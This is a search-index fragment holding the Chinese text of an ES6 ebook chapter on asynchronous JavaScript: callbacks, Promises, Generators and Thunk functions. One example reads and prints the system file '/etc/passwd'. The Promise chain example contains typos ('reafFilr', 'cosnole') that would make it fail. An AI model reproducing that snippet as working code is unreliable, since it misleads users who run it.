\u8bde\u751f\u4ee5\u524d\uff0c\u5f02\u6b65\u7f16\u7a0b\u7684\u65b9\u6cd5\uff0c\u5927\u6982\u6709\u4e0b\u9762\u56db\u79cd\uff1a\u56de\u8c03\u51fd\u6570\u3001\u4e8b\u4ef6\u76d1\u542c\u3001\u53d1\u5e03/\u8ba2\u9605\u3001Promise \u5bf9\u8c61</p>"},{"location":"ebook-JSES6-RYF/19-Generator%E5%BC%82%E6%AD%A5%E5%BA%94%E7%94%A8/#_2","title":"\u56de\u8c03\u51fd\u6570","text":"<p>\u56de\u8c03\u51fd\u6570\uff0c\u5c31\u662f\u628a\u4efb\u52a1\u7684\u7b2c\u4e8c\u6bb5\u5355\u72ec\u5199\u5728\u4e00\u4e2a\u51fd\u6570\u91cc\u9762\uff0c\u7b49\u5230\u91cd\u65b0\u6267\u884c\u8fd9\u4e2a\u4efb\u52a1\u7684\u65f6\u5019\uff0c\u5c31\u76f4\u63a5\u8c03\u7528\u8fd9\u4e2a\u51fd\u6570\u3002\u56de\u8c03\u51fd\u6570\u7684\u82f1\u8bed\u540d\u5b57<code>callback</code>\uff0c\u76f4\u8bd1\u8fc7\u6765\u5c31\u662f\"\u91cd\u65b0\u8c03\u7528\"\u3002</p> <pre><code>fs.readFile('/etc/passwd', 'utf-8', (err, data) =&gt; {\n  if (err) throw err;\n  console.log(data);\n});\n</code></pre> <p>\u7b2c\u4e00\u6bb5\u6267\u884c\u5b8c\u4ee5\u540e\uff0c\u4efb\u52a1\u6240\u5728\u7684\u4e0a\u4e0b\u6587\u73af\u5883\u5c31\u5df2\u7ecf\u7ed3\u675f\u4e86\u3002\u5728\u8fd9\u4ee5\u540e\u629b\u51fa\u7684\u9519\u8bef\uff0c\u539f\u6765\u7684\u4e0a\u4e0b\u6587\u73af\u5883\u5df2\u7ecf\u65e0\u6cd5\u6355\u6349\uff0c\u53ea\u80fd\u5f53\u4f5c\u53c2\u6570\uff0c\u4f20\u5165\u56de\u8c03\u51fd\u6570\u4e2d\u5904\u7406\u3002</p>"},{"location":"ebook-JSES6-RYF/19-Generator%E5%BC%82%E6%AD%A5%E5%BA%94%E7%94%A8/#promise","title":"Promise","text":"<p>\u56de\u8c03\u51fd\u6570\u672c\u8eab\u5e76\u6ca1\u6709\u95ee\u9898\uff0c\u5b83\u7684\u95ee\u9898\u51fa\u73b0\u5728\u591a\u4e2a\u56de\u8c03\u51fd\u6570\u5d4c\u5957\u3002\u5047\u5b9a\u8bfb\u53d6<code>A</code>\u6587\u4ef6\u4e4b\u540e\uff0c\u518d\u8bfb\u53d6<code>B</code>\u6587\u4ef6\uff0c\u4ee3\u7801\u5982\u4e0b\u3002</p> <pre><code>fs.readFile(fileA, 'utf-8', function (err, data) {\n  fs.readFile(fileB, 'utf-8', function (err, data) {\n    // ...\n  });\n});\n</code></pre> <p>\u4e0d\u96be\u60f3\u8c61\uff0c\u5982\u679c\u4f9d\u6b21\u8bfb\u53d6\u4e24\u4e2a\u4ee5\u4e0a\u7684\u6587\u4ef6\uff0c\u5c31\u4f1a\u51fa\u73b0\u591a\u91cd\u5d4c\u5957\u3002\u4ee3\u7801\u4e0d\u662f\u7eb5\u5411\u53d1\u5c55\uff0c\u800c\u662f\u6a2a\u5411\u53d1\u5c55\uff0c\u5f88\u5feb\u5c31\u4f1a\u4e71\u6210\u4e00\u56e2\uff0c\u65e0\u6cd5\u7ba1\u7406\u3002\u56e0\u4e3a==\u591a\u4e2a\u5f02\u6b65\u64cd\u4f5c\u5f62\u6210\u4e86\u5f3a\u8026\u5408==\uff0c\u53ea\u8981\u6709\u4e00\u4e2a\u64cd\u4f5c\u9700\u8981\u4fee\u6539\uff0c\u5b83\u7684\u4e0a\u5c42\u56de\u8c03\u51fd\u6570\u548c\u4e0b\u5c42\u56de\u8c03\u51fd\u6570\uff0c\u53ef\u80fd\u90fd\u8981\u8ddf\u7740\u4fee\u6539\u3002\u8fd9\u79cd\u60c5\u51b5\u5c31\u79f0\u4e3a\"\u56de\u8c03\u51fd\u6570\u5730\u72f1\"\uff08callback hell\uff09\u3002</p> <p>Promise \u5bf9\u8c61\u5c31\u662f\u4e3a\u4e86\u89e3\u51b3\u8fd9\u4e2a\u95ee\u9898\u800c\u63d0\u51fa\u7684\u3002\u5b83\u4e0d\u662f\u65b0\u7684\u8bed\u6cd5\u529f\u80fd\uff0c\u800c\u662f\u4e00\u79cd\u65b0\u7684\u5199\u6cd5\uff0c\u5141\u8bb8\u5c06\u56de\u8c03\u51fd\u6570\u7684\u5d4c\u5957\uff0c\u6539\u6210\u94fe\u5f0f\u8c03\u7528\u3002\u91c7\u7528 Promise\uff0c\u8fde\u7eed\u8bfb\u53d6\u591a\u4e2a\u6587\u4ef6\uff0c\u5199\u6cd5\u5982\u4e0b\u3002</p> <pre><code>var readFile = require('fs-readfile-promise');\n\nreadFile(fileA).then((data) =&gt; {\n  console.log(data);\n}).then(() =&gt; {\n  return reafFilr(B)\n}).then((data) =&gt; {\n  console.log(data);\n}).catch((err) =&gt; {\n  cosnole.log(err)\n});\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u6211\u4f7f\u7528\u4e86<code>fs-readfile-promise</code>\u6a21\u5757\uff0c\u5b83\u7684\u4f5c\u7528\u5c31\u662f\u8fd4\u56de\u4e00\u4e2a Promise \u7248\u672c\u7684<code>readFile</code>\u51fd\u6570\u3002Promise \u63d0\u4f9b<code>then</code>\u65b9\u6cd5\u52a0\u8f7d\u56de\u8c03\u51fd\u6570\uff0c<code>catch</code>\u65b9\u6cd5\u6355\u6349\u6267\u884c\u8fc7\u7a0b\u4e2d\u629b\u51fa\u7684\u9519\u8bef\u3002</p> <p>\u53ef\u4ee5\u770b\u5230\uff0cPromise \u7684\u5199\u6cd5\u53ea\u662f\u56de\u8c03\u51fd\u6570\u7684\u6539\u8fdb\uff0c\u4f7f\u7528<code>then</code>\u65b9\u6cd5\u4ee5\u540e\uff0c\u5f02\u6b65\u4efb\u52a1\u7684\u4e24\u6bb5\u6267\u884c\u770b\u5f97\u66f4\u6e05\u695a\u4e86\uff0c\u9664\u6b64\u4ee5\u5916\uff0c\u5e76\u65e0\u65b0\u610f\u3002</p> <p>Promise \u7684\u6700\u5927\u95ee\u9898\u662f==\u4ee3\u7801\u5197\u4f59==\uff0c\u539f\u6765\u7684\u4efb\u52a1\u88ab Promise \u5305\u88c5\u4e86\u4e00\u4e0b\uff0c\u4e0d\u7ba1\u4ec0\u4e48\u64cd\u4f5c\uff0c\u4e00\u773c\u770b\u53bb\u90fd\u662f\u4e00\u5806<code>then</code>\uff0c\u539f\u6765\u7684\u8bed\u4e49\u53d8\u5f97\u5f88\u4e0d\u6e05\u695a\u3002</p>"},{"location":"ebook-JSES6-RYF/19-Generator%E5%BC%82%E6%AD%A5%E5%BA%94%E7%94%A8/#2generator","title":"2\u3001Generator \u51fd\u6570","text":""},{"location":"ebook-JSES6-RYF/19-Generator%E5%BC%82%E6%AD%A5%E5%BA%94%E7%94%A8/#_3","title":"\u534f\u7a0b","text":"<p>\u4f20\u7edf\u7684\u7f16\u7a0b\u8bed\u8a00\uff0c\u65e9\u6709\u5f02\u6b65\u7f16\u7a0b\u7684\u89e3\u51b3\u65b9\u6848\uff08\u5176\u5b9e\u662f\u591a\u4efb\u52a1\u7684\u89e3\u51b3\u65b9\u6848\uff09\u3002\u5176\u4e2d\u6709\u4e00\u79cd\u53eb\u505a\"\u534f\u7a0b\"\uff0c\u610f\u601d\u662f\u591a\u4e2a\u7ebf\u7a0b\u4e92\u76f8\u534f\u4f5c\uff0c\u5b8c\u6210\u5f02\u6b65\u4efb\u52a1\u3002</p> <p>\u534f\u7a0b\u6709\u70b9\u50cf\u51fd\u6570\uff0c\u53c8\u6709\u70b9\u50cf\u7ebf\u7a0b\u3002\u5b83\u7684\u8fd0\u884c\u6d41\u7a0b\u5927\u81f4\u5982\u4e0b\u3002</p> <ul> <li>\u7b2c\u4e00\u6b65\uff0c\u534f\u7a0b<code>A</code>\u5f00\u59cb\u6267\u884c\u3002</li> <li>\u7b2c\u4e8c\u6b65\uff0c\u534f\u7a0b<code>A</code>\u6267\u884c\u5230\u4e00\u534a\uff0c\u8fdb\u5165\u6682\u505c\uff0c\u6267\u884c\u6743\u8f6c\u79fb\u5230\u534f\u7a0b<code>B</code>\u3002</li> <li>\u7b2c\u4e09\u6b65\uff0c\u534f\u7a0b<code>B</code>\u4ea4\u8fd8\u6267\u884c\u6743\u3002</li> <li>\u7b2c\u56db\u6b65\uff0c\u534f\u7a0b<code>A</code>\u6062\u590d\u6267\u884c\u3002</li> </ul> <p>\u4e0a\u9762\u6d41\u7a0b\u7684\u534f\u7a0b<code>A</code>\uff0c\u5c31\u662f\u5f02\u6b65\u4efb\u52a1\uff0c\u56e0\u4e3a\u5b83\u5206\u6210\u4e24\u6bb5\uff08\u6216\u591a\u6bb5\uff09\u6267\u884c\u3002</p> <p>\u4e3e\u4f8b\u6765\u8bf4\uff0c\u8bfb\u53d6\u6587\u4ef6\u7684\u534f\u7a0b\u5199\u6cd5\u5982\u4e0b\u3002</p> <pre><code>function* asyncJob() {\n  // ...\u5176\u4ed6\u4ee3\u7801\n  var f = yield readFile(fileA);\n  // ...\u5176\u4ed6\u4ee3\u7801\n}\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u7684\u51fd\u6570<code>asyncJob</code>\u662f\u4e00\u4e2a\u534f\u7a0b\uff0c\u5b83\u7684\u5965\u5999\u5c31\u5728\u5176\u4e2d\u7684<code>yield</code>\u547d\u4ee4\u3002\u5b83\u8868\u793a\u6267\u884c\u5230\u6b64\u5904\uff0c\u6267\u884c\u6743\u5c06\u4ea4\u7ed9\u5176\u4ed6\u534f\u7a0b\u3002\u4e5f\u5c31\u662f\u8bf4\uff0c<code>yield</code>\u547d\u4ee4\u662f\u5f02\u6b65\u4e24\u4e2a\u9636\u6bb5\u7684\u5206\u754c\u7ebf\u3002</p> <p>\u534f\u7a0b\u9047\u5230<code>yield</code>\u547d\u4ee4\u5c31\u6682\u505c\uff0c\u7b49\u5230\u6267\u884c\u6743\u8fd4\u56de\uff0c\u518d\u4ece\u6682\u505c\u7684\u5730\u65b9\u7ee7\u7eed\u5f80\u540e\u6267\u884c\u3002\u5b83\u7684\u6700\u5927\u4f18\u70b9\uff0c\u5c31\u662f\u4ee3\u7801\u7684\u5199\u6cd5\u975e\u5e38\u50cf\u540c\u6b65\u64cd\u4f5c\uff0c\u5982\u679c\u53bb\u9664<code>yield</code>\u547d\u4ee4\uff0c\u7b80\u76f4\u4e00\u6a21\u4e00\u6837\u3002</p>"},{"location":"ebook-JSES6-RYF/19-Generator%E5%BC%82%E6%AD%A5%E5%BA%94%E7%94%A8/#generator_1","title":"Generator \u5b9e\u73b0\u534f\u7a0b","text":"<p>Generator \u51fd\u6570\u662f\u534f\u7a0b\u5728 ES6 \u7684\u5b9e\u73b0\uff0c\u6700\u5927\u7279\u70b9\u5c31\u662f\u53ef\u4ee5\u4ea4\u51fa\u51fd\u6570\u7684\u6267\u884c\u6743\uff08\u5373\u6682\u505c\u6267\u884c\uff09\u3002\u6574\u4e2a Generator \u51fd\u6570\u5c31\u662f\u4e00\u4e2a\u5c01\u88c5\u7684\u5f02\u6b65\u4efb\u52a1\uff0c\u6216\u8005\u8bf4\u662f\u5f02\u6b65\u4efb\u52a1\u7684\u5bb9\u5668\u3002\u5f02\u6b65\u64cd\u4f5c\u9700\u8981\u6682\u505c\u7684\u5730\u65b9\uff0c\u90fd\u7528<code>yield</code>\u8bed\u53e5\u6ce8\u660e\u3002</p> <pre><code>function* gen(x) {\n  var y = yield x + 2;\n  return y;\n}\n\nvar g = gen(1);\ng.next() // { value: 3, done: false }\ng.next() // { value: undefined, done: true }\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u8c03\u7528 Generator \u51fd\u6570\uff0c\u4f1a\u8fd4\u56de\u4e00\u4e2a\u5185\u90e8\u6307\u9488\uff08\u5373\u904d\u5386\u5668\uff09<code>g</code>\u3002\u8fd9\u662f Generator \u51fd\u6570\u4e0d\u540c\u4e8e\u666e\u901a\u51fd\u6570\u7684\u53e6\u4e00\u4e2a\u5730\u65b9\uff0c\u5373\u6267\u884c\u5b83\u4e0d\u4f1a\u8fd4\u56de\u7ed3\u679c\uff0c\u8fd4\u56de\u7684\u662f\u6307\u9488\u5bf9\u8c61\u3002\u8c03\u7528\u6307\u9488<code>g</code>\u7684<code>next</code>\u65b9\u6cd5\uff0c\u4f1a\u79fb\u52a8\u5185\u90e8\u6307\u9488\uff08\u5373\u6267\u884c\u5f02\u6b65\u4efb\u52a1\u7684\u7b2c\u4e00\u6bb5\uff09\uff0c\u6307\u5411\u7b2c\u4e00\u4e2a\u9047\u5230\u7684<code>yield</code>\u8bed\u53e5\uff0c\u4e0a\u4f8b\u662f\u6267\u884c\u5230<code>x + 2</code>\u4e3a\u6b62\u3002</p> <p>\u6362\u8a00\u4e4b\uff0c<code>next</code>\u65b9\u6cd5\u7684\u4f5c\u7528\u662f\u5206\u9636\u6bb5\u6267\u884c<code>Generator</code>\u51fd\u6570\u3002\u6bcf\u6b21\u8c03\u7528<code>next</code>\u65b9\u6cd5\uff0c\u4f1a\u8fd4\u56de\u4e00\u4e2a\u5bf9\u8c61\uff0c\u8868\u793a\u5f53\u524d\u9636\u6bb5\u7684\u4fe1\u606f\uff08<code>value</code>\u5c5e\u6027\u548c<code>done</code>\u5c5e\u6027\uff09\u3002<code>value</code>\u5c5e\u6027\u662f<code>yield</code>\u8bed\u53e5\u540e\u9762\u8868\u8fbe\u5f0f\u7684\u503c\uff0c\u8868\u793a\u5f53\u524d\u9636\u6bb5\u7684\u503c\uff1b<code>done</code>\u5c5e\u6027\u662f\u4e00\u4e2a\u5e03\u5c14\u503c\uff0c\u8868\u793a Generator \u51fd\u6570\u662f\u5426\u6267\u884c\u5b8c\u6bd5\uff0c\u5373\u662f\u5426\u8fd8\u6709\u4e0b\u4e00\u4e2a\u9636\u6bb5\u3002</p>"},{"location":"ebook-JSES6-RYF/19-Generator%E5%BC%82%E6%AD%A5%E5%BA%94%E7%94%A8/#_4","title":"\u6570\u636e\u4ea4\u6362\u548c\u9519\u8bef\u5904\u7406","text":"<p>Generator \u51fd\u6570\u53ef\u4ee5\u6682\u505c\u6267\u884c\u548c\u6062\u590d\u6267\u884c\uff0c\u8fd9\u662f\u5b83\u80fd\u5c01\u88c5\u5f02\u6b65\u4efb\u52a1\u7684\u6839\u672c\u539f\u56e0\u3002\u9664\u6b64\u4e4b\u5916\uff0c\u5b83\u8fd8\u6709\u4e24\u4e2a\u7279\u6027\uff0c\u4f7f\u5b83\u53ef\u4ee5\u4f5c\u4e3a\u5f02\u6b65\u7f16\u7a0b\u7684\u5b8c\u6574\u89e3\u51b3\u65b9\u6848\uff1a\u51fd\u6570\u4f53\u5185\u5916\u7684\u6570\u636e\u4ea4\u6362\u548c\u9519\u8bef\u5904\u7406\u673a\u5236\u3002</p> <p><code>next</code>\u8fd4\u56de\u503c\u7684 value \u5c5e\u6027\uff0c\u662f Generator \u51fd\u6570\u5411\u5916\u8f93\u51fa\u6570\u636e\uff1b<code>next</code>\u65b9\u6cd5\u8fd8\u53ef\u4ee5\u63a5\u53d7\u53c2\u6570\uff0c\u5411 Generator \u51fd\u6570\u4f53\u5185\u8f93\u5165\u6570\u636e\u3002</p> <pre><code>function* gen(x){\n  var y = yield x + 2;\n  return y;\n}\n\nvar g = gen(1);\ng.next() // { value: 3, done: false }\ng.next(2) // { value: 2, done: true }\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u7b2c\u4e00\u4e2a<code>next</code>\u65b9\u6cd5\u7684<code>value</code>\u5c5e\u6027\uff0c\u8fd4\u56de\u8868\u8fbe\u5f0f<code>x + 2</code>\u7684\u503c<code>3</code>\u3002\u7b2c\u4e8c\u4e2a<code>next</code>\u65b9\u6cd5\u5e26\u6709\u53c2\u6570<code>2</code>\uff0c\u8fd9\u4e2a\u53c2\u6570\u53ef\u4ee5\u4f20\u5165 Generator \u51fd\u6570\uff0c\u4f5c\u4e3a\u4e0a\u4e2a\u9636\u6bb5\u5f02\u6b65\u4efb\u52a1\u7684\u8fd4\u56de\u7ed3\u679c\uff0c\u88ab\u51fd\u6570\u4f53\u5185\u7684\u53d8\u91cf<code>y</code>\u63a5\u6536\u3002\u56e0\u6b64\uff0c\u8fd9\u4e00\u6b65\u7684<code>value</code>\u5c5e\u6027\uff0c\u8fd4\u56de\u7684\u5c31\u662f<code>2</code>\uff08\u53d8\u91cf<code>y</code>\u7684\u503c\uff09\u3002</p> <p>Generator \u51fd\u6570\u5185\u90e8\u8fd8\u53ef\u4ee5\u90e8\u7f72\u9519\u8bef\u5904\u7406\u4ee3\u7801\uff0c\u6355\u83b7\u51fd\u6570\u4f53\u5916\u629b\u51fa\u7684\u9519\u8bef\u3002</p> <pre><code>function* gen(x){\n  try {\n    var y = yield x + 2;\n  } catch (e){\n    console.log(e);\n  }\n  return y;\n}\n\nvar g = gen(1);\ng.next();\ng.throw('\u51fa\u9519\u4e86');\n// \u51fa\u9519\u4e86\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u7684\u6700\u540e\u4e00\u884c\uff0cGenerator \u51fd\u6570\u4f53\u5916\uff0c\u4f7f\u7528\u6307\u9488\u5bf9\u8c61\u7684<code>throw</code>\u65b9\u6cd5\u629b\u51fa\u7684\u9519\u8bef\uff0c\u53ef\u4ee5\u88ab\u51fd\u6570\u4f53\u5185\u7684<code>try...catch</code>\u4ee3\u7801\u5757\u6355\u83b7\u3002\u8fd9\u610f\u5473\u7740\uff0c\u51fa\u9519\u7684\u4ee3\u7801\u4e0e\u5904\u7406\u9519\u8bef\u7684\u4ee3\u7801\uff0c\u5b9e\u73b0\u4e86\u65f6\u95f4\u548c\u7a7a\u95f4\u4e0a\u7684\u5206\u79bb\uff0c\u8fd9\u5bf9\u4e8e\u5f02\u6b65\u7f16\u7a0b\u65e0\u7591\u662f\u5f88\u91cd\u8981\u7684\u3002</p>"},{"location":"ebook-JSES6-RYF/19-Generator%E5%BC%82%E6%AD%A5%E5%BA%94%E7%94%A8/#_5","title":"\u5c01\u88c5\u5f02\u6b65\u4efb\u52a1","text":"<p>\u4e0b\u9762\u770b\u770b\u5982\u4f55\u4f7f\u7528 Generator \u51fd\u6570\uff0c\u6267\u884c\u4e00\u4e2a\u771f\u5b9e\u7684\u5f02\u6b65\u4efb\u52a1\u3002</p> <pre><code>var fetch = require('node-fetch');\n\nfunction* gen(){\n  var url = 'https://api.github.com/users/github';\n  var result = yield fetch(url);\n  console.log(result.bio);\n}\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u4e2d\uff0cGenerator \u51fd\u6570\u5c01\u88c5\u4e86\u4e00\u4e2a\u5f02\u6b65\u64cd\u4f5c\uff0c\u8be5\u64cd\u4f5c\u5148\u8bfb\u53d6\u4e00\u4e2a\u8fdc\u7a0b\u63a5\u53e3\uff0c\u7136\u540e\u4ece JSON \u683c\u5f0f\u7684\u6570\u636e\u89e3\u6790\u4fe1\u606f\u3002\u5c31\u50cf\u524d\u9762\u8bf4\u8fc7\u7684\uff0c\u8fd9\u6bb5\u4ee3\u7801\u975e\u5e38\u50cf\u540c\u6b65\u64cd\u4f5c\uff0c\u9664\u4e86\u52a0\u4e0a\u4e86<code>yield</code>\u547d\u4ee4\u3002</p> <pre><code>var g = gen();\nvar result = g.next();\n\nresult.value.then(function(data){\n  return data.json();\n}).then(function(data){\n  g.next(data);\n});\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u9996\u5148\u6267\u884c Generator \u51fd\u6570\uff0c\u83b7\u53d6\u904d\u5386\u5668\u5bf9\u8c61\uff0c\u7136\u540e\u4f7f\u7528<code>next</code>\u65b9\u6cd5\uff08\u7b2c\u4e8c\u884c\uff09\uff0c\u6267\u884c\u5f02\u6b65\u4efb\u52a1\u7684\u7b2c\u4e00\u9636\u6bb5\u3002\u7531\u4e8e<code>Fetch</code>\u6a21\u5757\u8fd4\u56de\u7684\u662f\u4e00\u4e2a Promise \u5bf9\u8c61\uff0c\u56e0\u6b64\u8981\u7528<code>then</code>\u65b9\u6cd5\u8c03\u7528\u4e0b\u4e00\u4e2a<code>next</code>\u65b9\u6cd5\u3002</p> <p>\u53ef\u4ee5\u770b\u5230\uff0c\u867d\u7136 Generator \u51fd\u6570\u5c06\u5f02\u6b65\u64cd\u4f5c\u8868\u793a\u5f97\u5f88\u7b80\u6d01\uff0c\u4f46\u662f\u6d41\u7a0b\u7ba1\u7406\u5374\u4e0d\u65b9\u4fbf\uff08\u5373\u4f55\u65f6\u6267\u884c\u7b2c\u4e00\u9636\u6bb5\u3001\u4f55\u65f6\u6267\u884c\u7b2c\u4e8c\u9636\u6bb5\uff09\u3002</p>"},{"location":"ebook-JSES6-RYF/19-Generator%E5%BC%82%E6%AD%A5%E5%BA%94%E7%94%A8/#3thunk","title":"3\u3001Thunk \u51fd\u6570","text":"<p>Thunk \u51fd\u6570\u662f\u81ea\u52a8\u6267\u884c Generator \u51fd\u6570\u7684\u4e00\u79cd\u65b9\u6cd5\u3002</p>"},{"location":"ebook-JSES6-RYF/19-Generator%E5%BC%82%E6%AD%A5%E5%BA%94%E7%94%A8/#_6","title":"\u53c2\u6570\u7684\u6c42\u503c\u7b56\u7565","text":"<p>\u51fd\u6570\u7684\u53c2\u6570\u5230\u5e95\u5e94\u8be5\u4f55\u65f6\u6c42\u503c\u3002</p> <pre><code>var x = 1;\n\nfunction f(m) {\n  return m * 2;\n}\n\nf(x + 5)\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u5148\u5b9a\u4e49\u51fd\u6570<code>f</code>\uff0c\u7136\u540e\u5411\u5b83\u4f20\u5165\u8868\u8fbe\u5f0f<code>x + 5</code>\u3002</p> <p>\u4e00\u79cd\u610f\u89c1\u662f\"\u4f20\u503c\u8c03\u7528\"\uff08call by value\uff09\uff0c\u5373\u5728\u8fdb\u5165\u51fd\u6570\u4f53\u4e4b\u524d\uff0c\u5c31\u8ba1\u7b97<code>x + 5</code>\u7684\u503c\uff08\u7b49\u4e8e 6\uff09\uff0c\u518d\u5c06\u8fd9\u4e2a\u503c\u4f20\u5165\u51fd\u6570<code>f</code>\u3002C \u8bed\u8a00\u5c31\u91c7\u7528\u8fd9\u79cd\u7b56\u7565\u3002</p> <pre><code>f(x + 5)\n// \u4f20\u503c\u8c03\u7528\u65f6\uff0c\u7b49\u540c\u4e8e\nf(6)\n</code></pre> <p>\u4f20\u503c\u8c03\u7528\u6bd4\u8f83\u7b80\u5355\uff0c\u4f46\u662f\u5bf9\u53c2\u6570\u6c42\u503c\u7684\u65f6\u5019\uff0c\u5b9e\u9645\u4e0a\u8fd8\u6ca1\u7528\u5230\u8fd9\u4e2a\u53c2\u6570\uff0c\u6709\u53ef\u80fd\u9020\u6210\u6027\u80fd\u635f\u5931\u3002</p> <pre><code>function f(a, b){\n  return b;\n}\n\nf(3 * x * x - 2 * x - 1, x);\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u51fd\u6570<code>f</code>\u7684\u7b2c\u4e00\u4e2a\u53c2\u6570\u662f\u4e00\u4e2a\u590d\u6742\u7684\u8868\u8fbe\u5f0f\uff0c\u4f46\u662f\u51fd\u6570\u4f53\u5185\u6839\u672c\u6ca1\u7528\u5230\u3002\u5bf9\u8fd9\u4e2a\u53c2\u6570\u6c42\u503c\uff0c\u5b9e\u9645\u4e0a\u662f\u4e0d\u5fc5\u8981\u7684\u3002</p>"},{"location":"ebook-JSES6-RYF/19-Generator%E5%BC%82%E6%AD%A5%E5%BA%94%E7%94%A8/#thunk","title":"Thunk \u51fd\u6570\u7684\u542b\u4e49","text":"<p>\u7f16\u8bd1\u5668\u7684\u201c\u4f20\u540d\u8c03\u7528\u201d\u5b9e\u73b0\uff0c\u5f80\u5f80\u662f==\u5c06\u53c2\u6570\u653e\u5230\u4e00\u4e2a\u4e34\u65f6\u51fd\u6570\u4e4b\u4e2d==\uff0c\u518d\u5c06\u8fd9\u4e2a\u4e34\u65f6\u51fd\u6570\u4f20\u5165\u51fd\u6570\u4f53\u3002\u8fd9\u4e2a\u4e34\u65f6\u51fd\u6570\u5c31\u53eb\u505a Thunk \u51fd\u6570\u3002</p> <pre><code>function f(m) {\n  return m * 2;\n}\n\nf(x + 5);\n\n// \u7b49\u540c\u4e8e\n\nvar thunk = function () {\n  return x + 5;\n};\n\nfunction f(thunk) {\n  return thunk() * 2;\n}\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u51fd\u6570 f \u7684\u53c2\u6570<code>x + 5</code>\u88ab\u4e00\u4e2a\u51fd\u6570\u66ff\u6362\u4e86\u3002\u51e1\u662f\u7528\u5230\u539f\u53c2\u6570\u7684\u5730\u65b9\uff0c\u5bf9<code>Thunk</code>\u51fd\u6570\u6c42\u503c\u5373\u53ef\u3002</p> <p>\u8fd9\u5c31\u662f Thunk \u51fd\u6570\u7684\u5b9a\u4e49\uff0c\u5b83\u662f\u201c\u4f20\u540d\u8c03\u7528\u201d\u7684\u4e00\u79cd\u5b9e\u73b0\u7b56\u7565\uff0c\u7528\u6765\u66ff\u6362\u67d0\u4e2a\u8868\u8fbe\u5f0f\u3002</p>"},{"location":"ebook-JSES6-RYF/19-Generator%E5%BC%82%E6%AD%A5%E5%BA%94%E7%94%A8/#js-thunk","title":"JS \u7684 Thunk \u51fd\u6570","text":"<p>JavaScript \u8bed\u8a00\u662f\u4f20\u503c\u8c03\u7528\uff0c\u5b83\u7684 Thunk \u51fd\u6570\u542b\u4e49\u6709\u6240\u4e0d\u540c\u3002\u5728 JavaScript \u8bed\u8a00\u4e2d\uff0cThunk \u51fd\u6570\u66ff\u6362\u7684\u4e0d\u662f\u8868\u8fbe\u5f0f\uff0c\u800c\u662f\u591a\u53c2\u6570\u51fd\u6570\uff0c\u5c06\u5176\u66ff\u6362\u6210\u4e00\u4e2a\u53ea\u63a5\u53d7\u56de\u8c03\u51fd\u6570\u4f5c\u4e3a\u53c2\u6570\u7684\u5355\u53c2\u6570\u51fd\u6570\u3002</p> <pre><code>// \u6b63\u5e38\u7248\u672c\u7684readFile\uff08\u591a\u53c2\u6570\u7248\u672c\uff09\nfs.readFile(fileName, callback);\n\n// Thunk\u7248\u672c\u7684readFile\uff08\u5355\u53c2\u6570\u7248\u672c\uff09\nvar Thunk = function (fileName) {\n  return function (callback) {\n    return fs.readFile(fileName, callback);\n  };\n};\n\nvar readFileThunk = Thunk(fileName);\nreadFileThunk(callback);\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c<code>fs</code>\u6a21\u5757\u7684<code>readFile</code>\u65b9\u6cd5\u662f\u4e00\u4e2a\u591a\u53c2\u6570\u51fd\u6570\uff0c\u4e24\u4e2a\u53c2\u6570\u5206\u522b\u4e3a\u6587\u4ef6\u540d\u548c\u56de\u8c03\u51fd\u6570\u3002\u7ecf\u8fc7\u8f6c\u6362\u5668\u5904\u7406\uff0c\u5b83\u53d8\u6210\u4e86\u4e00\u4e2a\u5355\u53c2\u6570\u51fd\u6570\uff0c\u53ea\u63a5\u53d7\u56de\u8c03\u51fd\u6570\u4f5c\u4e3a\u53c2\u6570\u3002\u8fd9\u4e2a\u5355\u53c2\u6570\u7248\u672c\uff0c\u5c31\u53eb\u505a Thunk \u51fd\u6570\u3002</p> <p>\u4efb\u4f55\u51fd\u6570\uff0c\u53ea\u8981\u53c2\u6570\u6709\u56de\u8c03\u51fd\u6570\uff0c\u5c31\u80fd\u5199\u6210 Thunk \u51fd\u6570\u7684\u5f62\u5f0f\u3002\u4e0b\u9762\u662f\u4e00\u4e2a\u7b80\u5355\u7684 Thunk \u51fd\u6570\u8f6c\u6362\u5668\u3002</p> <pre><code>// ES5\u7248\u672c\nvar Thunk = function(fn){\n  return function (){\n    var args = Array.prototype.slice.call(arguments);\n    return function (callback){\n      args.push(callback);\n      return fn.apply(this, args);\n    }\n  };\n};\n\n// ES6\u7248\u672c\nconst Thunk = function(fn) {\n  return function (...args) {\n    return function (callback) {\n      return fn.call(this, ...args, callback);\n    }\n  };\n};\n</code></pre> <p>\u4f7f\u7528\u4e0a\u9762\u7684\u8f6c\u6362\u5668\uff0c\u751f\u6210<code>fs.readFile</code>\u7684 Thunk \u51fd\u6570\u3002</p> <pre><code>var readFileThunk = Thunk(fs.readFile);\nreadFileThunk(fileA)(callback);\n</code></pre> <p>\u4e0b\u9762\u662f\u53e6\u4e00\u4e2a\u5b8c\u6574\u7684\u4f8b\u5b50\u3002</p> <pre><code>function f(a, cb) {\n  cb(a);\n}\nconst ft = Thunk(f);\n\nft(1)(console.log) // 1\n</code></pre>"},{"location":"ebook-JSES6-RYF/19-Generator%E5%BC%82%E6%AD%A5%E5%BA%94%E7%94%A8/#thunkify","title":"Thunkify \u6a21\u5757","text":"<p>\u751f\u4ea7\u73af\u5883\u7684\u8f6c\u6362\u5668\uff0c\u5efa\u8bae\u4f7f\u7528 Thunkify \u6a21\u5757\u3002</p> <p>\u9996\u5148\u662f\u5b89\u88c5\u3002</p> <pre><code>$ npm install thunkify\n</code></pre> <p>\u4f7f\u7528\u65b9\u5f0f\u5982\u4e0b\u3002</p> <pre><code>var thunkify = require('thunkify');\nvar fs = require('fs');\n\nvar read = thunkify(fs.readFile);\nread('package.json')(function(err, str){\n  // ...\n});\n</code></pre> <p>Thunkify 